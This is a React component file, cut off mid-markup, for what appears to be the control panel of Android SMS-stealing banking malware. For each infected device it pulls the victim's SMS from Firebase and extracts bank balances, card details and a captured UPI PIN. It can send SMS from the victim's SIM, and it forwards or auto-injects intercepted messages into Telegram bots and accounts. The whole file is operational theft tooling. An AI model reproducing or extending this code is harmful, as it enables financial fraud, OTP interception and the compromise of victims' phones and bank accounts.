import { useState, useEffect, useRef, useCallback } from 'react'
import {
  Wifi, Trash2, X, RefreshCw, IndianRupee, CreditCard, MessageSquare, Send,
  Zap, ChevronRight, Phone as PhoneIcon, Signal, TrendingUp, TrendingDown, EyeOff, Eye,
  Bot, SendHorizontal, Pin, StickyNote
} from '../icons'
import { firebaseGet, firebasePut, firebaseDelete, loadDeviceMessages } from '../utils/firebase'
import { extractMessages, analyzeMessages, relativeTime, formatTimestamp, formatIndianNumber } from '../utils/smsParser'
import { startBot, stopBot, getStatus, testBot, loadBotConfig, saveBotConfig, loadSendHistory, addSendHistory, loadDeviceMeta, saveDeviceMeta, loadEnvConfig, saveEnvConfig, injectSms, loadInjectConfig, saveInjectConfig, tgUserStatus, tgUserLogin, tgUserVerify, tgUserPassword, tgUserLogout, startInject, stopInject, injectStatus } from '../utils/telegramBot'
import BankBalanceCard from './BankBalanceCard'
import CreditCardInfo from './CreditCardInfo'
import DeviceDetailRow from './DeviceDetailRow'
import CopyButton from './CopyButton'

export default function DeviceDetailPanel({ dev, fbUrl, fbKey, onClose, onDelete, showToast }) {
  const [messages, setMessages] = useState([])
  const [analysis, setAnalysis] = useState({ bankBalances: [], cards: [], phoneNumbers: [], networks: [] })
  const [loading, setLoading] = useState(true)
  const [smsTo, setSmsTo] = useState('')
  const [smsText, setSmsText] = useState('')
  const [simSlot, setSimSlot] = useState(1)
  const [sending, setSending] = useState(false)
  const [activeTab, setActiveTab] = useState('info')
  const [botToken, setBotToken] = useState('')
  const [botChannelId, setBotChannelId] = useState('')
  const [botRunning, setBotRunning] = useState(false)
  const [botDeviceId, setBotDeviceId] = useState('')
  const [botStats, setBotStats] = useState({ totalForwarded: 0, successCount: 0, failCount: 0, lastError: null })
  const [botStarting, setBotStarting] = useState(false)
  const [botTesting, setBotTesting] = useState(false)
  const [sendHistory, setSendHistory] = useState([])
  const [deviceNote, setDeviceNote] = useState('')
  const [devicePinned, setDevicePinned] = useState(false)
  const [noteExpanded, setNoteExpanded] = useState(false)
  const [botExpanded, setBotExpanded] = useState(false)
  const [injectExpanded, setInjectExpanded] = useState(false)
  const [injToken, setInjToken] = useState('')
  const [injChatId, setInjChatId] = useState('')
  const [injSender, setInjSender] = useState('')
  const [injMessage, setInjMessage] = useState('')
  const [injSending, setInjSending] = useState(false)
  const [injectRunning, setInjectRunning] = useState(false)
  const [injectBusy, setInjectBusy] = useState(false)
  const [autoInjectOn, setAutoInjectOn] = useState(true)
  const [autoCount, setAutoCount] = useState(0)
  const messagesRef = useRef(null)
  const autoLastRef = useRef('')
  const autoTimingRef = useRef(0)
  const [tgLinked, setTgLinked] = useState(false)
  const [tgName, setTgName] = useState('')
  const [tgId, setTgId] = useState('')
  const [injBotUsername, setInjBotUsername] = useState('')
  const [tgConfigError, setTgConfigError] = useState('')
  const [tgBusy, setTgBusy] = useState(false)
  const [tgPhone, setTgPhone] = useState('')
  const [tgCode, setTgCode] = useState('')
  const [tgPwd, setTgPwd] = useState('')
  const [tgStage, setTgStage] = useState('idle')
  const botPollRef = useRef(null)
  const botSaveRef = useRef(null)
  const noteSaveRef = useRef(null)
  const intervalRef = useRef(null)

  const fetchSms = useCallback(async () => {
    try {
      const msgs = await loadDeviceMessages(fbUrl, fbKey, dev.id)
      messagesRef.current = msgs
      setMessages(msgs)
      setAnalysis(analyzeMessages(msgs))
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      if (msg.includes('PERMISSION_DENIED')) showToast('Firebase permission denied')
      setMessages([])
    } finally {
      setLoading(false)
    }
  }, [dev.id, fbUrl, fbKey, showToast])

  const handleAutoInject = useCallback(async (m) => {
    const key = `${m.sender}|${m.text}`
    if (autoLastRef.current === key && Date.now() - autoTimingRef.current < 30000) return
    autoLastRef.current = key
    autoTimingRef.current = Date.now()
    try {
      const res = await injectSms({ botToken: injToken, botUsername: injBotUsername, chatId: injChatId, sender: m.sender, message: m.text })
      const entry = { to: m.sender, message: m.text, sim: simSlot, status: res.ok ? 'sent' : 'failed', source: 'auto', error: res.ok ? null : res.error }
      addSendHistory(dev.id, fbUrl, entry)
      setSendHistory(loadSendHistory(dev.id, fbUrl))
      if (res.ok) {
        setAutoCount(c => c + 1)
        showToast('Auto-inject: ' + m.sender)
      }
    } catch {}
  }, [injToken, injBotUsername, injChatId, simSlot, dev.id, fbUrl, showToast])

  useEffect(() => {
    fetchSms()
    intervalRef.current = setInterval(async () => {
      try {
        const msgs = await loadDeviceMessages(fbUrl, fbKey, dev.id)
        const prev = messagesRef.current
        if (prev && prev.length > 0 && injectRunning && autoInjectOn && injChatId) {
          const newOnes = msgs.filter(m => !prev.some(p => p.text === m.text && p.sender === m.sender))
          for (const m of newOnes.slice(0, 5)) handleAutoInject(m)
        }
        const prevTexts = JSON.stringify((messagesRef.current || []).map(m => m.text))
        messagesRef.current = msgs
        const newTexts = JSON.stringify(msgs.map(m => m.text))
        if (prevTexts !== newTexts) {
          setMessages(msgs)
          const newAnalysis = analyzeMessages(msgs)
          setAnalysis(newAnalysis)
          if (newAnalysis.bankBalances.length > 0) showToast('New bank SMS detected')
          else if (!injectRunning || !autoInjectOn) showToast('New message received')
        }
      } catch {}
    }, 6000)
    return () => { if (intervalRef.current) clearInterval(intervalRef.current) }
  }, [fetchSms, dev.id, fbUrl, fbKey, showToast, injectRunning, autoInjectOn, injChatId, handleAutoInject])

  useEffect(() => {
    saveDeviceMeta(dev.id, { seenAt: Date.now() })
    loadEnvConfig().then(envCfg => {
      if (envCfg && envCfg.botToken) {
        setBotToken(envCfg.botToken)
        setBotChannelId(envCfg.channelId || '')
      } else {
        const saved = loadBotConfig(dev.id)
        if (saved) {
          setBotToken(saved.token || '')
          setBotChannelId(saved.channelId || '')
          if (saved.sim) setSimSlot(saved.sim)
        }
      }
      if (envCfg && (envCfg.injectBotToken || envCfg.injectChatId || envCfg.injectBotUsername)) {
        setInjToken(envCfg.injectBotToken || '')
        setInjChatId(envCfg.injectChatId || '')
        setInjBotUsername(envCfg.injectBotUsername || '')
        saveInjectConfig(dev.id, { token: envCfg.injectBotToken || '', chatId: envCfg.injectChatId || '', username: envCfg.injectBotUsername || '' })
      }
    })
    const meta = loadDeviceMeta(dev.id)
    if (meta.note) setDeviceNote(meta.note)
    if (meta.pinned) setDevicePinned(true)
    setSendHistory(loadSendHistory(dev.id))
    const injCfg = loadInjectConfig(dev.id)
    if (injCfg) {
      setInjToken(injCfg.token || '')
      setInjChatId(injCfg.chatId || '')
      setInjBotUsername(injCfg.username || '')
    }
    let lastMsgId = null
    botPollRef.current = setInterval(async () => {
      try {
        const status = await getStatus()
        if (status.ok || status.running !== undefined) {
          const isThisDevice = status.running && status.config?.deviceId === dev.id
          setBotRunning(!!status.running)
          setBotDeviceId(status.running ? (status.config?.deviceId || '?') : '')
          setBotStats({ totalForwarded: status.processed || 0, successCount: status.processed || 0, failCount: 0, lastError: status.error || null })
          if (isThisDevice && status.lastMessage && status.lastMessage.time !== lastMsgId) {
            lastMsgId = status.lastMessage.time
            const entry = {
              to: status.lastMessage.to || 'unknown',
              message: status.lastMessage.type || 'Bot forwarded',
              sim: status.config?.sim || 1,
              status: status.lastMessage.ok ? 'sent' : 'failed',
              source: 'bot',
              error: status.lastMessage.ok ? null : 'Firebase error'
            }
            addSendHistory(dev.id, fbUrl, entry)
            setSendHistory(loadSendHistory(dev.id, fbUrl))
          }
        }
      } catch {}
    }, 3000)
    return () => {
      if (botPollRef.current) clearInterval(botPollRef.current)
      if (botSaveRef.current) clearTimeout(botSaveRef.current)
      if (noteSaveRef.current) clearTimeout(noteSaveRef.current)
    }
  }, [dev.id])

  useEffect(() => {
    if (noteSaveRef.current) clearTimeout(noteSaveRef.current)
    noteSaveRef.current = setTimeout(() => {
      saveDeviceMeta(dev.id, { note: deviceNote })
    }, 800)
  }, [deviceNote, dev.id])

  useEffect(() => {
    if (botSaveRef.current) clearTimeout(botSaveRef.current)
    botSaveRef.current = setTimeout(() => {
      if (botToken || botChannelId) {
        saveBotConfig(dev.id, { token: botToken, channelId: botChannelId, sim: simSlot })
      }
    }, 1000)
  }, [botToken, botChannelId, simSlot, dev.id])

  useEffect(() => {
    const t = setTimeout(() => {
      if (injToken || injChatId) {
        saveInjectConfig(dev.id, { token: injToken, chatId: injChatId })
      }
    }, 1000)
    return () => clearTimeout(t)
  }, [injToken, injChatId, dev.id])

  const loadTgStatus = useCallback(async () => {
    const s = await tgUserStatus()
    setTgLinked(!!s.connected)
    setTgName(s.name || '')
    setTgId(s.id || '')
    setTgConfigError(s.error || '')
    if (!s.connected) setTgStage('idle')
  }, [])

  const loadInjectStatus = useCallback(async () => {
    const s = await injectStatus()
    setInjectRunning(!!s.running)
  }, [])

  useEffect(() => {
    if (activeTab === 'inject') {
      loadInjectStatus()
      const t = setInterval(loadInjectStatus, 3000)
      return () => clearInterval(t)
    }
  }, [activeTab, loadInjectStatus])

  const handleStartInject = async () => {
    if (!tgLinked) { showToast('Pehle Telegram account link karo (upar)'); return }
    if (!injChatId) { showToast('Enter chat ID'); return }
    setInjectBusy(true)
    try {
      const res = await startInject({ botToken: injToken, botUsername: injBotUsername, chatId: injChatId })
      if (res.ok) {
        setInjectRunning(true)
        showToast('START — capture + inject ON hoop gaya')
      } else {
        showToast(res.error || 'Start failed')
      }
    } catch { showToast('Bot server not reachable') }
    finally { setInjectBusy(false) }
  }

  const handleStopInject = async () => {
    setInjectBusy(true)
    try {
      const res = await stopInject({ botToken: injToken, botUsername: injBotUsername, chatId: injChatId })
      setInjectRunning(false)
      showToast(res.ok ? 'Inject OFF — band ho gaya' : (res.error || 'Stop failed'))
    } catch { showToast('Bot server not reachable') }
    finally { setInjectBusy(false) }
  }

  const handleSaveInjectEnv = async () => {
    if (!injToken && !injChatId && !injBotUsername) { showToast('Pehle values bharo'); return }
    const ok = await saveEnvConfig({ injectBotToken: injToken || '', injectChatId: injChatId || '', injectBotUsername: injBotUsername || '' })
    showToast(ok ? 'Injected fields .env me save ho gaye!' : '.env save fail — server check karo')
  }

  useEffect(() => {
    loadTgStatus()
  }, [loadTgStatus])

  const handleTgSendCode = async () => {
    if (!tgPhone) { showToast('Enter phone number'); return }
    setTgBusy(true)
    try {
      const res = await tgUserLogin(tgPhone)
      if (res.ok) {
        setTgStage('code')
        showToast('Code sent to Telegram!')
      } else {
        showToast(res.error || 'Failed to send code')
      }
    } catch { showToast('Bot server not reachable') }
    finally { setTgBusy(false) }
  }

  const handleTgVerify = async () => {
    if (!tgCode) { showToast('Enter the code'); return }
    setTgBusy(true)
    try {
      if (tgStage === 'password') {
        const res = await tgUserPassword(tgPwd)
        if (res.ok) {
          setTgStage('done'); await loadTgStatus(); showToast('Telegram account linked!')
        } else {
          showToast(res.error || 'Wrong password')
          if (!res.passwordNeeded) setTgStage('code')
        }
      } else {
        const res = await tgUserVerify(tgCode)
        if (res.ok) {
          setTgStage('done'); await loadTgStatus(); showToast('Telegram account linked!')
        } else if (res.passwordNeeded) {
          setTgStage('password'); showToast('Enter 2FA password')
        } else {
          showToast(res.error || 'Wrong code')
        }
      }
    } catch { showToast('Bot server not reachable') }
    finally { setTgBusy(false) }
  }

  const handleTgLogout = async () => {
    setTgBusy(true)
    try {
      await tgUserLogout()
      setTgLinked(false); setTgName(''); setTgStage('idle'); setTgPhone(''); setTgCode(''); setTgPwd('')
      showToast('Account unlinked')
    } catch { showToast('Bot server not reachable') }
    finally { setTgBusy(false) }
  }

  const handleSendSms = async () => {
    if (!smsTo || !smsText) { showToast('Fill number and message'); return }
    setSending(true)
    try {
      await firebasePut(fbUrl, fbKey, `clients/${dev.id}/webhookEvent/sendSms`, {
        from: simSlot, to: smsTo, message: smsText, isSended: false
      })
      const entry = { to: smsTo, message: smsText, sim: simSlot, status: 'sent', source: 'manual' }
      addSendHistory(dev.id, fbUrl, entry)
      setSendHistory(loadSendHistory(dev.id, fbUrl))
      showToast('SMS queued!')
      setSmsText('')
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      const entry = { to: smsTo, message: smsText, sim: simSlot, status: 'failed', source: 'manual', error: msg }
      addSendHistory(dev.id, fbUrl, entry)
      setSendHistory(loadSendHistory(dev.id, fbUrl))
      showToast(msg.includes('PERMISSION_DENIED') ? 'Firebase permission denied' : 'Send failed')
    } finally {
      setSending(false)
    }
  }

  const handleStartBot = async () => {
    if (!botToken || !botChannelId) { showToast('Enter bot token and channel ID'); return }
    setBotStarting(true)
    try {
      const res = await startBot({ botToken, channelId: botChannelId, firebaseUrl: fbUrl, deviceId: dev.id, sim: simSlot })
      if (res.ok) {
        showToast('Bot started!')
        setBotRunning(true)
        saveBotConfig(dev.id, { token: botToken, channelId: botChannelId, sim: simSlot })
        const entry = { to: 'Bot Started', message: `Bot activated for ${dev.id}`, sim: simSlot, status: 'sent', source: 'bot' }
            addSendHistory(dev.id, fbUrl, entry)
            setSendHistory(loadSendHistory(dev.id, fbUrl))
      } else {
        showToast(res.error || 'Failed to start bot')
      }
    } catch (e) {
      showToast('Bot server not reachable. Run: node bot-server.js')
    } finally {
      setBotStarting(false)
    }
  }

  const handleStopBot = async () => {
    try {
      const res = await stopBot()
      setBotRunning(false)
      showToast('Bot stopped')
    } catch {
      showToast('Bot server not reachable')
    }
  }

  const handleTestBot = async () => {
    setBotTesting(true)
    try {
      const res = await testBot()
      showToast(res.ok ? 'Test message sent!' : (res.error || 'Test failed'))
    } catch {
      showToast('Bot server not reachable')
    } finally {
      setBotTesting(false)
    }
  }

  const handleInjectSms = async () => {
    if (!tgLinked) { showToast('Pehle Telegram account link karo (upar)'); return }
    if (!injChatId) { showToast('Enter chat ID'); return }
    if (!injSender || !injMessage) { showToast('Fill sender and message'); return }
    setInjSending(true)
    try {
      const res = await injectSms({ botToken: injToken, chatId: injChatId, botUsername: injBotUsername, sender: injSender, message: injMessage })
      if (res.ok) {
        saveInjectConfig(dev.id, { token: injToken, chatId: injChatId })
        const entry = { to: injSender, message: injMessage, sim: simSlot, status: 'sent', source: 'inject', via: res.via || '' }
        addSendHistory(dev.id, fbUrl, entry)
        setSendHistory(loadSendHistory(dev.id, fbUrl))
        showToast('SMS injected via your account!')
      } else {
        showToast(res.error || 'Injection failed')
        const entry = { to: injSender, message: injMessage, sim: simSlot, status: 'failed', source: 'inject', error: res.error }
        addSendHistory(dev.id, fbUrl, entry)
        setSendHistory(loadSendHistory(dev.id, fbUrl))
      }
    } catch {
      showToast('Bot server not reachable')
    } finally {
      setInjSending(false)
    }
  }

  const togglePin = () => {
    const newVal = !devicePinned
    setDevicePinned(newVal)
    saveDeviceMeta(dev.id, { pinned: newVal })
    showToast(newVal ? 'Device pinned' : 'Device unpinned')
  }

  const handleDelete = async () => {
    if (confirm(`Delete "${dev.name}" permanently?`)) {
      try {
        await firebaseDelete(fbUrl, fbKey, `clients/${dev.id}`)
        showToast('Device deleted')
        onDelete()
      } catch (err) {
        const msg = err instanceof Error ? err.message : String(err)
        showToast(msg.includes('PERMISSION_DENIED') ? 'Firebase permission denied' : 'Delete failed')
      }
    }
  }

  const batColor = dev.batteryPercent >= 60 ? '#86efac' : dev.batteryPercent >= 30 ? '#fde68a' : '#ef4444'
  const displayPhone = dev.phoneNumber && dev.phoneNumber !== '—' ? dev.phoneNumber : analysis.phoneNumbers[0] || '—'
  const displayNetwork = dev.provider && dev.provider !== '—' ? dev.provider : analysis.networks[0] || '—'

  const tabs = [
    { key: 'info', label: 'Info' },
    { key: 'bank', label: `Bank (${analysis.bankBalances.length})` },
    ...(analysis.cards.length > 0 ? [{ key: 'card', label: `Card (${analysis.cards.length})` }] : []),
    { key: 'sms', label: `SMS (${messages.length})` },
    { key: 'send', label: 'Send' },
    { key: 'inject', label: 'Inject' }
  ]

  return (
    <div className="fixed inset-0 z-50 flex" onClick={onClose}>
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" />
      <div className="relative ml-auto w-full max-w-md h-full flex flex-col bg-[#0d0d0d] border-l border-[#1f1f1f] shadow-2xl animate-slide-in" onClick={e => e.stopPropagation()}>
        <div className="flex items-center justify-between px-5 py-4 border-b border-[#1a1a1a]">
          <div className="flex items-center gap-3">
            <div className={`w-9 h-9 rounded-xl flex items-center justify-center ${dev.status ? 'bg-emerald-500/15 border border-emerald-500/25' : 'bg-[#1a1a1a] border border-[#262626]'}`}>
              <Wifi className={`w-4 h-4 ${dev.status ? 'text-emerald-400' : 'text-[#444]'}`} />
            </div>
            <div>
              <div className="flex items-center gap-1.5">
                <h3 className="text-sm font-bold text-white">{dev.name}</h3>
                <button onClick={togglePin} className="p-0.5 rounded transition-colors hover:bg-white/5">
                  <Pin className={`w-3 h-3 ${devicePinned ? 'text-amber-400' : 'text-[#444]'}`} style={devicePinned ? { filter: 'drop-shadow(0 0 4px #fbbf24)' } : {}} />
                </button>
              </div>
              <p className="text-[10px] font-mono text-[#555] mt-0.5">{dev.id}</p>
            </div>
          <div className="flex items-center gap-2">
            <button onClick={handleDelete} className="p-2 rounded-xl bg-red-950/40 border border-red-900/30 text-red-400 hover:bg-red-950/70 transition-colors">
              <Trash2 className="w-4 h-4" />
            </button>
            <button onClick={onClose} className="p-2 rounded-xl bg-[#1a1a1a] border border-[#262626] text-[#888] hover:text-white transition-colors">
              <X className="w-4 h-4" />
            </button>
          </div>
        </div>
        </div>
        <div className="flex items-center gap-3 px-5 py-2.5 bg-[#0a0a0a] border-b border-[#1a1a1a] flex-wrap">
          <div className="flex items-center gap-1.5">
            <span className={`w-2 h-2 rounded-full ${dev.status ? 'bg-emerald-500' : 'bg-[#333]'}`} style={dev.status ? { boxShadow: '0 0 6px #22c55e' } : {}} />
            <span className={`text-xs font-semibold ${dev.status ? 'text-emerald-400' : 'text-[#555]'}`}>{dev.status ? 'Online' : 'Offline'}</span>
            {!dev.status && dev.lastSeen && <span className="text-[10px] font-mono text-red-400/70">since {relativeTime(dev.lastSeen)}</span>}
          </div>
          <div className="flex items-center gap-1">
            <span className="text-[10px] text-[#555]">Bat</span>
            <span className="text-[10px] font-bold" style={{ color: batColor }}>{dev.battery}</span>
          </div>
          {dev.upipin && <span className="px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400">UPI: {dev.upipin.split('|')[0]}</span>}
          {analysis.bankBalances.length > 0 && <span className="px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-[10px] font-semibold text-emerald-400">{analysis.bankBalances.length} Bank SMS</span>}
          {analysis.cards.length > 0 && <span className="px-2 py-0.5 rounded-full bg-purple-500/10 border border-purple-500/20 text-[10px] font-semibold text-purple-400">{analysis.cards.length} Card</span>}
        </div>
        <div className="flex border-b border-[#1a1a1a] px-2 overflow-x-auto">
          {tabs.map(tab => (
            <button key={tab.key} onClick={() => setActiveTab(tab.key)}
              className={`px-3 py-3 text-[11px] font-semibold border-b-2 whitespace-nowrap transition-all ${
                activeTab === tab.key
                  ? tab.key === 'bank' ? 'border-emerald-500 text-emerald-400' : tab.key === 'card' || tab.key === 'inject' ? 'border-purple-500 text-purple-400' : 'border-red-500 text-red-400'
                  : 'border-transparent text-[#555] hover:text-[#888]'
              }`}>{tab.label}</button>
          ))}
        </div>
        <div className="flex-1 overflow-y-auto">
          {activeTab === 'info' && (
            <div className="px-5 py-4">
              {!dev.status && dev.lastSeen && (
                <div className="mb-4 p-3 rounded-xl bg-red-950/20 border border-red-900/30 border-l-2 border-l-red-500/60">
                  <p className="text-[9px] uppercase tracking-widest text-red-700 mb-1 font-semibold">Last Seen (Offline Since)</p>
                  <p className="text-base font-black text-red-400">{relativeTime(dev.lastSeen)}</p>
                  <p className="text-[10px] font-mono text-red-700/70 mt-0.5">{formatTimestamp(dev.lastSeen)}</p>
                </div>
              )}
              {dev.status && dev.lastSeen && (
                <div className="mb-4 p-3 rounded-xl bg-emerald-950/20 border border-emerald-900/30">
                  <p className="text-[9px] uppercase tracking-widest text-emerald-700 mb-1 font-semibold">Last Activity</p>
                  <p className="text-[11px] font-mono text-emerald-500">{formatTimestamp(dev.lastSeen)}</p>
                </div>
              )}
              <p className="text-[10px] uppercase tracking-widest text-[#444] mb-3 font-semibold">Device</p>
              <DeviceDetailRow label="Phone Number" value={displayPhone} mono />
              <DeviceDetailRow label="Network" value={displayNetwork} />
              <DeviceDetailRow label="Android" value={dev.android} />
              <DeviceDetailRow label="IP Address" value={dev.ip} mono />
              <DeviceDetailRow label="Storage" value={dev.storage} />
              <DeviceDetailRow label="CPU Arch" value={dev.cpu} mono />
              <DeviceDetailRow label="SDK Version" value={dev.sdk} />
              <DeviceDetailRow label="SIM Cards" value={`${dev.sims.length} SIM(s)`} />
              {dev.sims.map((sim, i) => sim.phoneNumber && <DeviceDetailRow key={i} label={`SIM ${i+1} Number`} value={sim.phoneNumber} mono />)}
              {analysis.phoneNumbers.length > 0 && (
                <>
                  <p className="text-[10px] uppercase tracking-widest text-[#444] mt-4 mb-3 font-semibold">From SMS</p>
                  {analysis.phoneNumbers.map((phone, i) => <DeviceDetailRow key={i} label={`Phone #${i+1}`} value={phone} mono highlight="text-blue-400" />)}
                </>
              )}
              {analysis.networks.map((net, i) => <DeviceDetailRow key={i} label={`Network #${i+1}`} value={net} highlight="text-purple-400" />)}
            </div>
          )}
          {activeTab === 'bank' && (
            <div className="flex flex-col h-full">
              <div className="flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]">
                <div>
                  <span className="text-xs text-[#555]">Auto-detected from {messages.length} SMS</span>
                  {analysis.bankBalances.length > 0 && <p className="text-[10px] text-emerald-600/70 mt-0.5">{analysis.bankBalances.length} bank message(s) found</p>}
                </div>
                <button onClick={fetchSms} className="p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors">
                  <RefreshCw className="w-3.5 h-3.5" />
                </button>
              </div>
              <div className="flex-1 overflow-y-auto px-4 py-3 space-y-2">
                {loading ? (
                  <div className="py-12 text-center">
                    <div className="w-6 h-6 border-2 border-[#333] border-t-emerald-500 rounded-full animate-spin mx-auto mb-3" />
                    <p className="text-xs text-[#555]">Scanning bank SMS...</p>
                  </div>
                ) : analysis.bankBalances.length === 0 ? (
                  <div className="py-12 text-center">
                    <IndianRupee className="w-10 h-10 mx-auto mb-3 text-[#2a2a2a]" />
                    <p className="text-sm font-medium text-[#444]">No bank SMS found</p>
                    <p className="text-xs text-[#333] mt-1 px-4 leading-relaxed">Bank transaction SMS with balance will appear here automatically</p>
                  </div>
                ) : (
                  <>
                    <div className="p-3 rounded-xl bg-[#081410] border border-emerald-900/40 mb-1">
                      <p className="text-[10px] uppercase tracking-widest text-emerald-700 mb-1">Latest Balance · {analysis.bankBalances[0].bankName}</p>
                      <div className="flex items-end gap-2">
                        <span className="text-2xl font-black text-white">₹{formatIndianNumber(analysis.bankBalances[0].availableBalance)}</span>
                        {analysis.bankBalances[0].accountLast4 && <span className="text-xs text-emerald-700 mb-0.5 font-mono">••{analysis.bankBalances[0].accountLast4}</span>}
                      </div>
                    </div>
                    {analysis.bankBalances.map((bal, i) => <BankBalanceCard key={i} balance={bal} />)}
                  </>
                )}
              </div>
            </div>
          )}
          {activeTab === 'card' && (
            <div className="flex flex-col h-full">
              <div className="flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]">
                <span className="text-xs text-[#555]">Card info found in SMS messages</span>
                <button onClick={fetchSms} className="p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors">
                  <RefreshCw className="w-3.5 h-3.5" />
                </button>
              </div>
              <div className="flex-1 overflow-y-auto px-4 py-3 space-y-2">
                {analysis.cards.length === 0 ? (
                  <div className="py-12 text-center">
                    <CreditCard className="w-10 h-10 mx-auto mb-3 text-[#2a2a2a]" />
                    <p className="text-sm font-medium text-[#444]">No card info found</p>
                  </div>
                ) : analysis.cards.map((card, i) => <CreditCardInfo key={i} card={card} />)}
              </div>
            </div>
          )}
          {activeTab === 'sms' && (
            <div className="flex flex-col h-full">
              <div className="flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a]">
                <span className="text-xs text-[#555]">Last 150 messages · auto-refreshes</span>
                <button onClick={fetchSms} className="p-1.5 rounded-lg hover:bg-white/5 text-[#555] hover:text-[#888] transition-colors">
                  <RefreshCw className="w-3.5 h-3.5" />
                </button>
              </div>
              <div className="flex-1 overflow-y-auto px-4 py-3 space-y-2">
                {loading ? (
                  <div className="py-12 text-center">
                    <div className="w-6 h-6 border-2 border-[#333] border-t-red-500 rounded-full animate-spin mx-auto mb-3" />
                    <p className="text-xs text-[#555]">Loading messages…</p>
                  </div>
                ) : messages.length === 0 ? (
                  <div className="py-12 text-center">
                    <MessageSquare className="w-10 h-10 mx-auto mb-3 text-[#2a2a2a]" />
                    <p className="text-sm font-medium text-[#444]">No messages</p>
                  </div>
                ) : messages.map((msg, i) => {
                  const isBank = /AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(msg.text)
                  const isCard = /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(msg.text)
                  const borderColor = isCard ? 'border-l-purple-600/60' : isBank ? 'border-l-emerald-600/60' : 'border-l-red-600/60'
                  const bgColor = isCard ? 'bg-[#100d18]' : isBank ? 'bg-[#0a130d]' : 'bg-[#111]'
                  const badgeColor = isCard ? 'text-purple-400' : isBank ? 'text-emerald-400' : 'text-red-400'
                  return (
                    <div key={i} className={`p-3 rounded-xl border border-[#1e1e1e] border-l-2 ${borderColor} ${bgColor}`}>
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-1.5">
                          <span className={`text-xs font-bold ${badgeColor}`}>{msg.sender}</span>
                          {isBank && <IndianRupee className="w-3 h-3 text-emerald-600/70" />}
                          {isCard && <CreditCard className="w-3 h-3 text-purple-600/70" />}
                        </div>
                        <div className="flex items-center gap-1">
                          <CopyButton text={msg.text} />
                          <span className="text-[10px] text-[#444] font-mono">{msg.time}</span>
                        </div>
                      </div>
                      <p className="text-xs text-[#aaa] leading-relaxed">{msg.text.substring(0, 250)}</p>
                    </div>
                  )
                })}
              </div>
              <div className="border-t border-[#1a1a1a] px-4 py-3">
                <button onClick={() => setNoteExpanded(!noteExpanded)}
                  className="w-full flex items-center gap-2 py-2 px-3 rounded-xl bg-[#111] border border-[#222] hover:border-[#333] transition-all">
                  <StickyNote className={`w-3.5 h-3.5 ${deviceNote ? 'text-amber-400' : 'text-[#555]'}`} />
                  <span className="text-xs font-semibold text-[#888]">Note / Reminder</span>
                  {deviceNote && <span className="text-[9px] text-amber-500/70 ml-auto">saved</span>}
                </button>
                {noteExpanded && (
                  <div className="mt-2">
                    <textarea value={deviceNote} onChange={e => setDeviceNote(e.target.value)}
                      rows={2} placeholder="Write your note or reminder for this device…"
                      className="w-full px-3 py-2.5 rounded-xl bg-[#111] border border-[#222] focus:border-amber-600/50 focus:ring-1 focus:ring-amber-600/20 outline-none text-xs text-white placeholder:text-[#444] resize-none transition-all" />
                  </div>
                )}
              </div>
            </div>
          )}
          {activeTab === 'send' && (
            <div className="px-5 py-4 space-y-4">
              <div>
                <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Select SIM</p>
                <div className="flex gap-2">
                  {[1, 2].map(slot => (
                    <button key={slot} onClick={() => setSimSlot(slot)}
                      className={`flex-1 py-2.5 rounded-xl text-sm font-bold transition-all ${simSlot === slot ? 'bg-red-600 text-white shadow-lg shadow-red-900/40' : 'bg-[#111] border border-[#222] text-[#666] hover:border-[#333] hover:text-[#888]'}`}>
                      SIM {slot}
                    </button>
                  ))}
                </div>
              </div>
              <div>
                <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Recipient</p>
                <input type="text" value={smsTo} onChange={e => setSmsTo(e.target.value)} placeholder="+919876543210"
                  className="w-full px-4 py-3 rounded-xl bg-[#111] border border-[#222] focus:border-red-600/50 focus:ring-1 focus:ring-red-600/20 outline-none text-sm text-white placeholder:text-[#444] font-mono transition-all" />
              </div>
              <div>
                <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Message</p>
                <textarea value={smsText} onChange={e => setSmsText(e.target.value)} rows={4} placeholder="Type your message here…"
                  className="w-full px-4 py-3 rounded-xl bg-[#111] border border-[#222] focus:border-red-600/50 focus:ring-1 focus:ring-red-600/20 outline-none text-sm text-white placeholder:text-[#444] resize-none transition-all" />
                <p className="text-[10px] text-[#444] mt-1 text-right">{smsText.length} chars</p>
              </div>
              <button onClick={handleSendSms} disabled={sending}
                className="w-full flex items-center justify-center gap-2 py-3.5 rounded-xl bg-red-600 hover:bg-red-700 text-white font-bold text-sm shadow-lg shadow-red-900/40 transition-all disabled:opacity-50 disabled:cursor-not-allowed">
                {sending ? <><div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> Sending…</> : <><Send className="w-4 h-4" /> Send via SIM {simSlot}</>}
              </button>
              {displayPhone && displayPhone !== '—' && (
                <button onClick={() => setSmsTo(displayPhone)}
                  className="w-full py-2.5 rounded-xl border border-[#222] bg-[#111] text-xs text-[#666] hover:text-[#888] hover:border-[#333] transition-all">
                  Use device number: <span className="font-mono text-[#888]">{displayPhone}</span>
                </button>
              )}

              {sendHistory.length > 0 && (
                <div>
                  <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Send History</p>
                  <div className="max-h-40 overflow-y-auto space-y-1.5">
                    {sendHistory.slice(0, 20).map((entry) => {
                      const isSent = entry.status === 'sent'
                      return (
                        <div key={entry.id} className={`flex items-start gap-2 p-2 rounded-lg border ${isSent ? 'bg-[#0a1410] border-emerald-900/30' : 'bg-[#1a0a0a] border-red-900/30'}`}>
